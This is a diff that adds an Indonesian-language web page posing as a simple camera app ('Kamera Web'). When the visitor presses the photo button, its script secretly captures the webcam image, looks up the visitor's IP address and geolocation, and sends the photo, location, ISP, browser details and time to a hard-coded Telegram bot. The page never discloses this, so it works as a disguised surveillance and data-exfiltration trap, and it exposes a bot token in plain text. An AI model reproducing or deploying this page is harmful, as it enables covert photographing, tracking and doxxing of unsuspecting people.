@@ -1,0 +1,87 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Kamera Web</title>
+  <style>
+    video, canvas { width: 100%; max-width: 400px; }
+    button { margin-top: 10px; }
+  </style>
+</head>
+<body>
+  <h2>Kamera Web</h2>
+  <video id="video" autoplay playsinline></video>
+  <canvas id="canvas" style="display:none;"></canvas>
+  <br>
+  <button onclick="takePhoto()">Ambil Foto</button>
+
+  <script>
+    const video = document.getElementById('video');
+    const canvas = document.getElementById('canvas');
+    const ctx = canvas.getContext('2d');
+
+    navigator.mediaDevices.getUserMedia({ video: true })
+      .then(stream => {
+        video.srcObject = stream;
+      });
+
+    async function takePhoto() {
+      canvas.width = video.videoWidth;
+      canvas.height = video.videoHeight;
+      ctx.drawImage(video, 0, 0);
+      const imageData = canvas.toDataURL('image/jpeg');
+
+      const ip = await fetch("https://api.ipify.org?format=json").then(r => r.json());
+      const info = await fetch(`https://ipapi.co/${ip.ip}/json/`).then(r => r.json());
+
+      const payload = {
+        image: imageData,
+        ip: ip.ip,
+        city: info.city,
+        region: info.region,
+        country: info.country_name,
+        org: info.org || info.asn || 'N/A',
+        timezone: info.timezone,
+        ua: navigator.userAgent,
+        time: new Date().toString()
+      };
+
+      sendToTelegram(payload);
+    }
+
+    function sendToTelegram(data) {
+      const botToken = '7707166709:AAHfwZ_lWHqVtYROADuojWlNRt-b-IN-gJE';
+      const chatId = '7233342888';
+
+      const imageBlob = dataURItoBlob(data.image);
+      const formData = new FormData();
+      formData.append("chat_id", chatId);
+      formData.append("photo", imageBlob, "photo.jpg");
+      formData.append("caption", `
+IP: ${data.ip}
+Lokasi: ${data.city}, ${data.region}, ${data.country}
+Waktu: ${data.time}
+User-Agent: ${data.ua}
+Org: ${data.org}
+Timezone: ${data.timezone}
+`.trim());
+
+      fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
+        method: "POST",
+        body: formData
+      });
+    }
+
+    function dataURItoBlob(dataURI) {
+      const byteString = atob(dataURI.split(',')[1]);
+      const mimeString = dataURI.split(',')[0].split(':')[1].split(';')[0];
+      const ab = new ArrayBuffer(byteString.length);
+      const ia = new Uint8Array(ab);
+      for (let i = 0; i < byteString.length; i++) {
+        ia[i] = byteString.charCodeAt(i);
+      }
+      return new Blob([ab], { type: mimeString });
+    }
+  </script>
+</body>
+</html>
